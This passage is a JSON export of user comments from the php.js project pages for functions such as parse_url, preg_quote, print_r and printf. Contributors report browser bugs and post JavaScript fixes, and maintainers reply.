string\n\n\"name=98_20&id_azienda=3&id_sede=12&revisione=0&selectFolder=linee&module_from=98_20&id_from=&id_orig=0&nome=Promemoria+pianificazione+prossimo+audit&descrizione=Promemoria+per+la+necessit%E0+di+pianificare+il+prossimo+audit&id_assegnatario=1&nome_assegnatario=SYSTEM\"\n\ncauses a \"malformed URI sequence\" error.\n\nHow can we solve it? I do not see any error in the query string."},{"date":"2012-01-02 04:19:49","author":"David Pesta","url":"davidpesta.com","comment":"tl;dr - On line 89, change [] to {} so that it reads: eval(evalStr + ' = {};');\n\nMany of the array functions in the php.js library return javascript objects instead of javascript arrays, which is good. Javascript objects are much more PHPish than javascript arrays. But this function returns a javascript array instead of a javascript object, which can lead to unexpected problems if you are expecting this to behave like PHP (namely, a large number as a key will cause the javascript array to add null values in all of its indexes up to the value of that key, where in PHP it won't do that--pretty frustrating). To fix this, simply replace the [] with {} inside the eval on line 89 where the parent \"arrays\" are iteratively created. This will make it create objects instead."},{"date":"2012-05-29 15:04:23","author":"jeicquest","url":"","comment":"line:24+ \n[CODE]\nreset = 0,\n[\/CODE]\nline:80-90\n[CODE]\nfor (j = 0; j < keys.length; j++) {\n                    key = keys[j];\n                    if ((key !== '' && key !== ' ') || j === 0) {\n                        key = \"'\" + key + \"'\";\n                    } else {\n                        key = \"'\" + reset + \"'\";\n                        reset++;\n                        \/\/key = eval(evalStr + '.push([]);') - 1;\n                    }\n                    evalStr += '[' + key + ']';\n                    if (j !== keys.length - 1 && eval('typeof ' + evalStr) === 'undefined') {\n                        eval(evalStr + ' = {};');\n                        reset = 0;\n                    }\n                }\n[\/CODE]"},{"date":"2012-06-22 06:21:03","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Matteo: Your escape sequence (i.e., the part with \"necessit%E0\") is not using UTF-8. That is what JavaScript uses, and really what you should render in PHP (via header() and content-type).\n\n@jeicquest, @Zaide: I have hopefully taken into account your issues. Zaide, I did my own implementation in order to support multi-dimensional arrays\/objects while removing eval().\n\n@David Pesta: I agree. I have changed to an object literal instead of array."}],"parse_url":[{"date":"2010-03-30 17:07:35","author":"Lorenzo Pisani","url":"","comment":"this fails on some urls\n\nin PHP I can do this:\n[CODE]\nparse_url('hello\/world', PHP_URL_PATH) \/\/ gives me back hello\/world\n[\/CODE]\n\nbut I simply get \/world back from php.js because it thinks hello is the host"},{"date":"2010-10-19 09:15:34","author":"radekk","url":"","comment":"You didn't mentioned that it's doesn't work correctly when you use variables like (in GET):\n\n- scheme\n- host\n- user\n- path\n... and so on.\n\nI think that parameters should be separated and enclosed in an second object to not collide with each other. That's my opinion."},{"date":"2011-03-11 13:37:52","author":"Tony","url":"","comment":"This fails with a simple code like this :\n\nvar url = \"page.html\"\n\nit shows that host is page.html"},{"date":"2011-03-12 01:08:11","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@radekk: Can you clarify?\n@Tony & @Lorenzo Pisani: Finally getting to this. The issue was simply that the loose mode had been chosen by default. This should probably work more like PHP now, and I also cleaned up the function a bit and allowed custom ini settings to change the parsing mode (e.g., \"loose\" mode (set by \"phpjs.parse_url.mode\") is more useful when trying to guess at a user's imperfect input, but faulty as you found out; \"strict\" follows the same as the default \"php\" mode, but offers more properties, including parsing the query string further)."},{"date":"2011-03-12 01:09:31","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Tony & @Lorenzo Pisani: Also, I should mention, the fix is available in Git (raw js source URL)."},{"date":"2011-03-25 22:30:19","author":"Aaron","url":"ajgwin.com","comment":"I've been using this script for two years.  I just switched to FF4 and it now fails.  Error: \"regular expression too complex\" fails here in firebug \"var m = parser[mode].exec(str),\" only on a web server.  Works fine locally."},{"date":"2011-03-27 13:46:34","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Aaron. Can you provide more details? I tried on Apache, and it works fine. Or did you mean you tried in SSJS? What regex and sample are you using? One thing you can try is replacing the various \"()\" marks used in the php mode regex with the equivalent but longer, \"(.{0})\". Maybe Firefox4's new regex parser doesn't properly handle \"()\" under some conditions. If that doesn't work, let me know if changing by default to \"strict\" or \"loose\" mode instead of \"php\" (see the code on line 25 with \"|| 'php'\")."},{"date":"2012-03-22 13:50:56","author":"????? ???","url":"http:\/\/an3m1.com\/","comment":"New and exclusive news on the gate Yes "},{"date":"2012-05-11 14:29:17","author":"Patrick","url":"http:\/\/www.netzaffin.de","comment":"Hey guys! parse url saved my day. That easy, that great. I will include phpjs in my projects <3 thank you"},{"date":"2012-06-16 07:50:50","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Patrick: Thanks for the feedback! Most of the credit goes to Steven Levithan: http:\/\/blog.stevenlevithan.com"}],"pathinfo":[{"date":"2012-08-18 06:20:00","author":"Timo","url":"","comment":"pathinfo(\"htaccess\", PATHINFO_FILENAME) in PHP returns \"htaccess\",\nbut pathinfo(\"htaccess\", 'PATHINFO_FILENAME') in JS returns \"\"."},{"date":"2012-08-18 08:44:27","author":"Rafa?","url":"","comment":"@Timo: thanks for the report. I think, I've managed to fix it. Check github for latest changes."},{"date":"2012-09-18 17:23:57","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Timo, Rafa\u0142: there were a few other issues I noticed when comparing to PHP. Should now be fixed."}],"pi":[{"date":"2008-10-14 23:33:36","author":"Philip Peterson","url":"","comment":"Since PHP defaults to float 14, shouldn't we use the PHP-standard value of pi, 3.1415926535898 ?"},{"date":"2008-10-14 23:42:49","author":"Philip Peterson","url":"","comment":"I guess similarly, shouldn't all numbers (e.g. square roots) be truncated to 14 digits?"},{"date":"2008-10-15 09:25:45","author":"Onno Marsman","url":"","comment":"My opinions: \r\n\r\n1. We don't want to actually recreate PHP. We want to make PHP functions available for javascript, so a function that returns Pi, should return the javascript representation of Pi. The same goes for sqrt(2). \r\n\r\n2. I doubt that an increase in precision will bother anybody, or that a decrease will help anybody.\r\n\r\n3. There is a more obvious type representation difference between PHP and javascript that is bothering a lot of people: associative arrays. In JS we need objects to do this. I would like to make all array functions in a way they can handle these objects next to the normal arrays, but of course we'll never make a new Array object which handles associative arrays as well. And that's basically what you're asking here: to create a new Number type, which behaves differently than the JS native one.\r\n\r\nCould we and would we want to change the outcome of something like 1+pow(10, -15) ? I think not. (I haven't tested this for differences but you'll get the idea)"},{"date":"2011-06-30 15:34:27","author":"dude","url":"","comment":"just go with \"return 3.141592653589793\" BECAUSE IT NEVER CHANGES!!!!"},{"date":"2011-07-25 07:24:00","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@dude: OK!!!! :) (I also applied in Git to some other functions using PI or LN10.)"},{"date":"2012-04-17 15:30:12","author":"????? ????? ???","url":"http:\/\/an3m1.com\/","comment":"I agree it is a very informative article and I actually enjoy reading good stuff unlike all the crap out there on the internet \n"}],"pos":[{"date":"2011-12-01 12:03:05","author":"ffffffffffffffffffff","url":"gthhhhhhhhhhhhhhhhh","comment":"gggggggggggggggggggggggggggggffffffffffffff"}],"preg_quote":[{"date":"2008-01-23 03:37:40","author":"Ates Goral","url":"","comment":"Here's my take:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction preg_quote(str) {\r\n    \/\/ *     example 1: preg_quote(&quot;*RRRING* Hello?&quot;);\r\n    \/\/ *     returns 1: &quot;\\\\*RRRING\\\\* Hello\\\\?&quot;\r\n    \/\/ *     example 2: preg_quote(&quot;\\\\.+*?[^]$(){}=!&lt;&gt;|:&quot;);\r\n    \/\/ *     returns 2: &quot;\\\\\\\\\\\\.\\\\+\\\\*\\\\?\\\\[\\\\^\\\\]\\\\$\\\\(\\\\)\\\\{\\\\}\\\\=\\\\!\\\\&lt;\\\\&gt;\\\\|\\\\:&quot;\r\n    \r\n\treturn str.replace(\/[\\\\\\.\\+\\*\\?\\[\\^\\]\\$\\(\\)\\{\\}\\=\\!\\&lt;\\&gt;\\|\\:]\/g, function(c) { return &quot;\\\\&quot; + c; });\r\n}\r\n[\/CODE]"},{"date":"2008-01-23 08:31:52","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Ates Goral: There you go, 2 gold medals :)"},{"date":"2008-01-23 17:58:31","author":"Ates Goral","url":"","comment":"After looking at the implementation of addslashes(), I realized that this could have been simply achieved with:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nreturn str.replace(\/([\\\\\\.\\+\\*\\?\\[\\^\\]\\$\\(\\)\\{\\}\\=\\!\\&lt;\\&gt;\\|\\:])\/g, &quot;\\\\$1&quot;);\r\n[\/CODE]\r\n\r\nI don't know why I chose to use a replacement function in the first place :)"},{"date":"2008-01-23 20:20:44","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Ates Goral: Kaizen principles FTW"},{"date":"2008-04-12 08:33:47","author":"Simple preg_replace_callback","url":"","comment":"[CODE=&quot;Javascript&quot;]\r\nfunction preg_replace_callback(reg, cbck, str){\r\n\treturn str.replace(REGEXP, function(arguments){return window[cbck](arguments);});\r\n}\r\n[\/CODE]"},{"date":"2008-04-13 12:18:46","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ ?: Hi, thanks for the contribution. There are some things that keep me from including this in php.js. Firstly I don't know your name so I cannot credit you, Secondly, I don't know if the perl regular expressions are 100% compatible with the javascript regex engine. Do you know this?"},{"date":"2011-07-15 18:37:30","author":"Jon L.","url":"","comment":"PHP regex (PCRE) and JS regex (ECMA) are not 100% compatible:\nhttp:\/\/www.regular-expressions.info\/refflavors.html << see chart for differences."},{"date":"2011-07-20 03:35:47","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Jon. L: Yes, that's true--I guess you are talking about the fact that we escape \"<\" and \">\"? Yeah, those could be removed, but 1) It is harmless to escape them, 2) Safer to behave like PHP in case someone is passing something back to PHP, 3) I'm hoping at some point for us to port and build upon XRegExp so that our library does support the full PCRE syntax."},{"date":"2011-07-20 03:36:59","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"In addition to my post just now, there is also the possibility of ECMAScript itself supporting the more advanced syntax (not sure if they would for reasons of backward-compatibility)."}],"print_r":[{"date":"2008-03-04 23:15:33","author":"Alfonso Jim\u00e9nez","url":"","comment":"Hi Kevin! I post here the array_reduce function:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction array_reduce(a_input, callback) {\r\n       var lon = a_input.length;\r\n       var res = 0;\r\n       var tmp = new Array();\r\n\r\n       for(i = 0; i &lt; lon; i += 2) {\r\n\t    tmp[0] = a_input[i];\r\n\t    if(a_input[i+1])\r\n\t\ttmp[1] = a_input[i+1];\r\n\t    else\r\n\t\ttmp[1] = 0;\r\n\r\n\t    res += callback.apply(null, tmp);\r\n\t    tmp = new Array();\r\n\t}\r\n\r\n\treturn res;\r\n}\r\n[\/CODE]\r\n\r\nUsage example: \r\n\r\n[CODE=&quot;Javascript&quot;]\r\narray_reduce([1,2,3,4,5], function (x, y) { return (x+y); });\r\n[\/CODE]\r\n\r\nRegards!\r\nAlfonso Jim\u00c3\u00a9nez (http:\/\/www.alfonsojimenez.com)"},{"date":"2008-03-04 23:35:42","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Alfonso Jim\u00c3\u00a9nez: Great contribution, thank you very much!"},{"date":"2008-03-11 16:17:45","author":"ricardo avalos","url":"","comment":"Greats Work!!\r\n\r\nVery, very, very thanks you!!!\r\n\r\n\t\r\nAll my cordial greetings and appreciation from Chile\r\n\r\nRicardo\r\navalos.ricardo@gmail.com"},{"date":"2008-03-11 21:03:15","author":"Michael White","url":"","comment":"Found a bug in print_r()\r\n\r\n\r\nSo far this bug only seems to affect Netscape and the version I am using is 7.2\r\n\r\n\r\nReplace this segment:\r\n[CODE=&quot;Javascript&quot;]\r\nvar repeat_char = function (len, char) {\r\n\tvar str = &quot;&quot;;\r\n\tfor(var i=0; i &lt; len; i++) { str += char; };\r\n\treturn str;\r\n};\r\n[\/CODE]\r\n\r\nwith this segment:\r\n[CODE=&quot;Javascript&quot;]\r\nvar repeat_char = function (len, pad_char) {\r\n\tvar str = &quot;&quot;;\r\n\tfor(var i=0; i &lt; len; i++) { str += pad_char; };\r\n\treturn str;\r\n};\r\n[\/CODE]\r\n\r\nNetscape thinks that &quot;char&quot; is a reserved word and so cannot be used as a variable name. It errors out saying something about a formal parameter. Changing the 'char&quot; variable to &quot;pad_char&quot; solves that quite easily.\r\n\r\n\r\nhttp:\/\/crestidg.com"},{"date":"2008-03-15 11:55:34","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Michael White: replaced!"},{"date":"2008-05-08 14:27:04","author":"G\u00fcnter Kits","url":"","comment":"[CODE=&quot;Javascript&quot;]if(return_val !== true) {[\/CODE]\r\nshould be\r\n[CODE=&quot;Javascript&quot;]if(return_val == true) {[\/CODE]"},{"date":"2008-05-08 22:01:40","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ G\u00c3\u00bcnter Kits: I do not agree. When the return parameter is not true, the function should not return the string but print it instead. Unless I'm overlooking something, that's what it does now?"},{"date":"2008-05-20 06:00:20","author":"Ben Bryan","url":"","comment":"Where formatArray function is testing data types, it does not except types of Object, replacing the if statement with the following seems to overcome this. Basically letting OBject types be processed. Tested with FF.\r\n[CODE=&quot;Javascript&quot;]\r\n        if (obj instanceof Array || obj instanceof Object) {\r\n            str += &quot;Array\\n&quot; + base_pad + &quot;(\\n&quot;;\r\n            for (var key in obj) {\r\n                if (obj[key] instanceof Array || obj[key] instanceof Object) {\r\n                    str += thick_pad + &quot;[&quot;+key+&quot;] =&gt; &quot;+formatArray(obj[key], cur_depth+1, pad_val, pad_char);\r\n                } else {\r\n                    str += thick_pad + &quot;[&quot;+key+&quot;] =&gt; &quot; + obj[key] + &quot;\\n&quot;;\r\n                }\r\n            }\r\n            str += base_pad + &quot;)\\n&quot;;\r\n        } else {\r\n            str = obj.toString();\r\n        };\r\n[\/CODE]"},{"date":"2008-05-20 23:27:56","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Ben Bryan: Thanks a lot Ben!"},{"date":"2008-05-26 17:49:46","author":"vinnieboombots","url":"","comment":"used it on an array of all links on this page (firebug)\r\nit replaced the page contents with a comma separated value string of the array's values.\r\nie: http:\/\/kevin.vanzonneveld.net\/techblog,http:\/\/kevin.vanzonneveld.net\/techblog,http:\/\/kevin.vanzonneveld.net\/techblog,http:\/\/kevin.vanzonneveld.net\/techblog,http:\/\/kevin.vanzonneveld.net\/techblog,http:\/\/kevin.vanzonneveld.net\/techblog\r\n\r\nPhp's print_r output is different (&amp; better)\r\n\r\narray\r\n  [0]=&gt;http:\/\/kevin.vanzonneveld.net\/techblog\r\n  [1]=&gt;http:\/\/kevin.vanzonneveld.net\/links\r\n  [2]=&gt;http:\/\/kevin.vanzonneveld.net\/code\r\n  [3]=&gt;http:\/\/kevin.vanzonneveld.net\/about"},{"date":"2008-05-31 14:36:14","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ vinnieboombots: Looking at the code, I cannot establish how that could have happened at the moment. Would you be able to provide more debug info? (maybe a codeblock with how you tried to run print_r exactly?) Thank you."},{"date":"2008-06-04 17:14:28","author":"Alejandro","url":"","comment":"Excelent!!!!!!!!!!!"},{"date":"2008-08-07 09:17:48","author":"aron budinszky","url":"","comment":"here's a bit of an improvement for the print_r function (which, as it seems, ben bryan has partially posted below) to process nested objects as well as arrays. in addition to his code, it is important to print OBJECT or to print ARRAY for the appropriate data type, since accessing the data requires slightly different syntax.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n\/\/ {{{ print_r\r\nfunction print_r( array, return_val ) {\r\n    \/\/ Prints human-readable information about a variable\r\n    \/\/ \r\n    \/\/ +    discuss at: http:\/\/kevin.vanzonneveld.net\/techblog\/article\/javascript_equivalent_for_phps_print_r\/\r\n    \/\/ +       version: 803.612\r\n    \/\/ +   original by: Michael White (http:\/\/crestidg.com)\r\n    \/\/ *     example 1: print_r(['Kevin', 'van', 'Zonneveld']);\r\n    \/\/ *     returns 1: true\r\n\r\n    var output = &quot;&quot;, pad_char = &quot; &quot;, pad_val = 4;\r\n\r\n    var formatArray = function (obj, cur_depth, pad_val, pad_char) {\r\n        if(cur_depth &gt; 0)\r\n            cur_depth++;\r\n\r\n        var base_pad = repeat_char(pad_val*cur_depth, pad_char);\r\n        var thick_pad = repeat_char(pad_val*(cur_depth+1), pad_char);\r\n        var str = &quot;&quot;;\r\n        var name = &quot;&quot;;\r\n\r\n        if(obj instanceof Array || obj instanceof Object) {\r\n            if(obj instanceof Array) name = &quot;Array&quot;;\r\n            else name = &quot;Object&quot;;\r\n            str += name+&quot;\\n&quot; + base_pad + &quot;(\\n&quot;;\r\n            for(var key in obj) {\r\n                if(obj[key] instanceof Array || obj instanceof Object) {\r\n                    str += thick_pad + &quot;[&quot;+key+&quot;] =&gt; &quot;+formatArray(obj[key], cur_depth+1, pad_val, pad_char);\r\n                } else {\r\n                    str += thick_pad + &quot;[&quot;+key+&quot;] =&gt; &quot; + obj[key] + &quot;\\n&quot;;\r\n                }\r\n            }\r\n            str += base_pad + &quot;)\\n&quot;;\r\n        } else {\r\n            str = obj.toString();\r\n        };\r\n\r\n        return str;\r\n    };\r\n\r\n    var repeat_char = function (len, char) {\r\n        var str = &quot;&quot;;\r\n        for(var i=0; i &lt; len; i++) { str += char; };\r\n        return str;\r\n    };\r\n\r\n    output = formatArray(array, 0, pad_val, pad_char);\r\n\r\n    if(return_val !== true) {\r\n        document.write(&quot;&lt;pre&gt;&quot; + output + &quot;&lt;\/pre&gt;&quot;);\r\n        return true;\r\n    } else {\r\n        return output;\r\n    }\r\n}\/\/ }}}\r\n[\/CODE]"},{"date":"2008-08-07 09:27:32","author":"aron budinszky","url":"","comment":"oops. there was a mistake in my code below. here's the improved version...(using ben bryan's code). but i noticed that the line 6:\r\nif (obj[key] instanceof Array || obj[key] instanceof Object) \r\nis omitted from the current version in php.js, even though it is included in ben bryan's posted version...\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nif (obj instanceof Array || obj instanceof Object) {\r\n            if(obj instanceof Array) name = &quot;Array&quot;;\r\n            else name = &quot;Object&quot;;\r\n            str += name+&quot;\\n&quot; + base_pad + &quot;(\\n&quot;;\r\n            for (var key in obj) {\r\n                if (obj[key] instanceof Array || obj[key] instanceof Object) {\r\n                    str += thick_pad + &quot;[&quot;+key+&quot;] =&gt; &quot;+formatArray(obj[key], cur_depth+1, pad_val, pad_char);\r\n                } else {\r\n                    str += thick_pad + &quot;[&quot;+key+&quot;] =&gt; &quot; + obj[key] + &quot;\\n&quot;;\r\n                }\r\n            }\r\n            str += base_pad + &quot;)\\n&quot;;\r\n        } else {\r\n            str = obj.toString();\r\n        };\r\n[\/CODE]"},{"date":"2008-08-07 10:47:49","author":"aron budinszky","url":"","comment":"also, changing the newlines to &lt;br&gt; and the pad_char to &quot;&amp;nbsp;&quot; creates a more readable result, even if it deviates from the php norm. since print_r is normally used to visually represent data, and since javascript is typically run within a browser, this might be the preferred way in this case...of course the opposite can also be argued..."},{"date":"2008-08-27 17:34:32","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@aron budinszky: Thank you very much for your input. \r\nThe object vs array story is because PHP does not differentiate between numerically indexed arrays and 'associative arrays'. But as soon as JavaScript encounters an associative array, it becomes an 'Object'. This is an essential difference between JS &amp; PHP. In this project we've chosen to side with PHP.\r\n\r\nHopefully this answers your question. As for the BR tag, if I output PHP's print_r I can choose to enclose it between PRE tags. I would like JS scripters to be able to approach JS's print_r in the same manner."},{"date":"2008-09-25 14:52:01","author":"Francois","url":"","comment":"There is a missing coma (,) at line 2985\r\n\r\nit is:\r\n= string.replace(\/&amp;gt;\/g '&gt;');\r\n\r\nbut we should read:\r\n\r\n= string.replace(\/&amp;gt;\/g, '&gt;');"},{"date":"2008-09-29 12:33:29","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Francois: The bug was in the htmlspecialchars_decode function and has been fixed. Sorry for the inconvenience and thank you for tipping me!"},{"date":"2008-10-03 15:45:51","author":"Tomot","url":"","comment":"print_r(document, true) returns in IE7: &quot;[object]&quot;\r\nin FF3 works fine."},{"date":"2008-10-06 12:47:30","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Tomot: Thanks for sharing, can you tell if it produces errors on any line?"},{"date":"2008-11-19 15:53:51","author":"Alexander","url":"","comment":"May be need change:\r\n[CODE=&quot;Javascript&quot;]\r\nif (obj[key] instanceof Array) {\r\n[\/CODE]\r\nChange to:\r\n[CODE=&quot;Javascript&quot;]\r\nif (obj[key] instanceof Array || obj[key] instanceof Object) {\r\n[\/CODE]\r\ntherefor print a nested objects"},{"date":"2008-11-28 12:48:13","author":"nikdo","url":"","comment":"using for(var a in b) isnt a good idea as it doesnt work in ie and is replacable with regular for(e1;e2;e3)"},{"date":"2008-12-01 09:17:16","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ nikdo: regular for loops won't work for associative arrays (js objects) so we really need these 'for key in array' structures. What version of ie are you using? I find it hard to believe that IE in general does not support these kind of loops at all, because that would have led to problems earlier on."},{"date":"2008-12-31 02:36:32","author":"alexandre","url":"","comment":"no words are able to tell how wonderful is your work. Congratulations you all!!!\r\n\r\nPS: Sorry about my awful English... I'm Brazillian"},{"date":"2008-12-31 13:26:00","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ alexandre: I think your words are very clear :) Thanks alexandre, it's nice of you to let us know. Happy NYE tonight!"},{"date":"2009-02-03 00:34:18","author":"Dennis Day","url":"www.ddddesigns.com","comment":"This code works great for printing out variable information but do you think it would be possible to print out a javascript object?  I am new to javascript objects otherwise I would do it myself.  To be honest, I'm not even sure it is possible."},{"date":"2009-02-03 04:29:00","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"It can print out a JavaScript object. Since JavaScript has no special associative arrays, this project treats JavaScript objects like associative arrays (that's most likely why it says &quot;array&quot; when you put in a JS object)--and since PHP lets you put in arrays (and objects too), this function should too. var_export() is another option for you too. I hope we can also get var_dump() added at some point, but you should be able to see the contents of your JS objects with print_r or var_export()..."},{"date":"2010-10-08 07:36:20","author":"Nilesh","url":"","comment":"why is the use of print_r functaion in php\r\n\r\n"},{"date":"2011-09-13 13:28:56","author":"Krrish","url":"http:\/\/itech.hubpages.com","comment":"This is the Limit... Excellent work... You Guys converted nearly all PHP functions into JavaScript...\nYou Got another Fan for your site and for your work."}],"printf":[{"date":"2008-01-17 13:58:17","author":"someone","url":"","comment":"The php.js is a great project. But I know the similar project, p2js.\r\n\r\nhttp:\/\/p2js.googlecode.com\/svn\/trunk\/src\/"},{"date":"2008-01-17 18:05:20","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ someone: Wow I really thought I did my research but similar projects keep popping up. Thank you."},{"date":"2008-03-02 05:43:30","author":"Michael White","url":"","comment":"This function can be made a bit more flexible by not using the eval() function. This really helps more when using namespaces to encapsulate the code. Line three in the example shows the line I used when inside a closed namespace.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n\/\/ret = eval('sprintf(' + args + ')'); \/\/ Old\r\nret = sprintf.apply(this, args); \/\/ New\r\n\/\/ret = this.sprintf.apply(this, args); \/\/ When inside a closed namespace.\r\n[\/CODE]\r\n\r\nhttp:\/\/crestidg.com"},{"date":"2008-03-02 12:13:25","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Michael White: I agree that that would be better but it currently generates a: 'format has no properties' error on the line with:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nreturn format.replace(regex, function(substring, valueIndex, flags, minWidth, _, precision, type) {\r\n[\/CODE]"},{"date":"2008-03-02 17:37:11","author":"Michael White","url":"","comment":"What browser(s)? I think I have a solution anyway and I'm going to test it as soon as I can obtain that error message."},{"date":"2008-03-02 17:56:56","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Michael White: Firefox 2 with firebug addon on ubunty gutsy"},{"date":"2008-03-04 02:43:07","author":"Michael White","url":"","comment":"Hmm - not sure I can grab that OS but I'll see if I can get the error on another OS. The good news is that I have a new function: print_r()\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction print_r(array, return_val) {\r\n\tvar output = &quot;&quot;, pad_char = &quot; &quot;, pad_val = 3;\r\n\t\r\n\tfunction formatArray(obj, cur_depth, pad_val, pad_char) {\r\n\t\tif(cur_depth &gt; 0)\r\n\t\t\tcur_depth++;\r\n\t\t\r\n\t\tvar base_pad = repeat_char(pad_val*cur_depth, pad_char);\r\n\t\tvar thick_pad = repeat_char(pad_val*(cur_depth+1), pad_char);\r\n\t\tvar str = &quot;&quot;;\r\n\t\t\r\n\t\tif(obj instanceof Array) {\r\n\t\t\tstr += &quot;Array\\n&quot; + base_pad + &quot;(\\n&quot;;\r\n\t\t\tfor(var key in obj) {\r\n\t\t\t\tif(obj[key] instanceof Array) {\r\n\t\t\t\t\tstr += thick_pad + &quot;[&quot;+key+&quot;] =&gt; &quot;+formatArray(obj[key], cur_depth+1, pad_val, pad_char);\r\n\t\t\t\t} else {\r\n\t\t\t\t\tstr += thick_pad + &quot;[&quot;+key+&quot;] =&gt; &quot; + obj[key] + &quot;\\n&quot;;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tstr += base_pad + &quot;)\\n&quot;;\r\n\t\t} else {\r\n\t\t\tstr = obj.toString(); \/\/ They didn't pass in an array.... why? -- Do the best we can to output this object.\r\n\t\t};\r\n\t\t\r\n\t\treturn str;\r\n\t};\r\n\t\r\n\tfunction repeat_char(len, char) {\r\n\t\tvar str = &quot;&quot;;\r\n\t\tfor(var i=0; i &lt; len; i++) { str += char; };\r\n\t\treturn str;\r\n\t};\r\n\t\r\n\toutput = formatArray(array, 0, pad_val, pad_char);\r\n\t\r\n\tif(return_val !== true) {\r\n\t\tdocument.write(&quot;&lt;pre&gt;&quot; + output + &quot;&lt;\/pre&gt;&quot;);\r\n\t} else {\r\n\t\treturn output;\r\n\t}\r\n}\r\n\r\nThe &lt;pre&gt; tags here are optional for the version you release (although they are recommended) I like them because unless you have Firefox you probably can't view &quot;generated source&quot; and you won't be able to make sense of the data unless it is formatted.\r\n\r\nhttp:\/\/crestidg.com -- by the way - how do I add line breaks in this message box?\r\n[\/CODE]"},{"date":"2008-03-04 03:16:07","author":"Michael White","url":"","comment":"I ended up nearly rewriting this function...\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction printf( ) {\r\n    \/\/ *     example 1: printf(&quot;%01.2f&quot;, 123.1);\r\n    \/\/ *     returns 1: 6\r\n \r\n\tvar ret = this.sprintf.apply(this, arguments);\r\n\tdocument.write(ret);\r\n\treturn ret.length;\r\n}\r\n[\/CODE]\r\n\r\nThe previous code turned the arguments array into a string representation of that array. With eval() that works properly but with apply() it expects the arguments to be an array. All we have to do is leave the arguments array alone and pass it directly to the apply() function call. The &quot;this&quot; keyword makes sure the proper scope is used and applied to the function whether the code is namespaced or just in the global namespace as a simple function. Why it worked in a namespace when passing string arguments I cannot pretend to know.... but at least it works everywhere now."},{"date":"2008-03-04 05:37:23","author":"Michael White","url":"","comment":"floatval() : A nearly pointless addition. Only slightly more than a wrapper for JavaScript's parseFloat() method.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction floatval(mixed_var) {\r\n\t\/\/ *     example 1: floatval('150.03_page-section');\r\n\t\/\/ *     return 1: 150.03\r\n\t\/\/ *     example 2: floatval('page: 3');\r\n\t\/\/ *     return 2: 0\r\n\t\/\/ *     example 2: floatval('-50 + 8');\r\n\t\/\/ *     return 2: -50\r\n\t\r\n\t\/\/ Note: The native parseFloat() method of JavaScript returns NaN when it encounters a string before an int or float value.\r\n\t\r\n\treturn (parseFloat(mixed_var) || 0);\r\n}\r\n[\/CODE]\r\n\r\nhttp:\/\/crestidg.com"},{"date":"2008-03-04 07:36:07","author":"Michael White","url":"","comment":"Ok, I swear this is my last post tonight. I've just been really busy working on a few things that happen to really coincide with what is being done here with php.js\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n\/\/ This post doesn't have code - just a URL.\r\n\/\/ Use the URL in this post to find a source file with a few new functions and some updates to existing functions. It also contains updates to a couple of my own new functions that I have already posted and then found some little discrepancies in.\r\n\r\n\/\/ http:\/\/www.sprinkit.net\/aether\/php_js-updates.js\r\n\r\nMaybe in the future I will just save all my work on php.js stuff into a single file and post it all at once so this doesn't happen again.\r\n[\/CODE]"},{"date":"2008-03-04 17:05:50","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Michael White: LOL :) No problem dude. Thanks for all of the hard work. There still are some errors though: http:\/\/kevin.vanzonneveld.net\/pj_tester.php"},{"date":"2008-03-04 17:25:28","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Michael White: two of them were related to flawed examples of my own ;) but i think there is still some discrepancies between include &amp; require ?"},{"date":"2009-01-29 04:10:16","author":"Brett Zamir","url":"","comment":"Here's vprintf based largely on printf (and helped a little by vsprintf).\r\n\r\nI think the lines in printf dealing with setting up body should also allow (as does my vprintf below) for getElementsByTagNameNS if available or the last child of the XML document if body is not available (allows this function to work in XUL, etc.):\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n    var HTMLNS = 'http:\/\/www.w3.org\/1999\/xhtml';\r\n    body = document.getElementsByTagNameNS ? \r\n\t\t\t(document.getElementsByTagNameNS(HTMLNS, 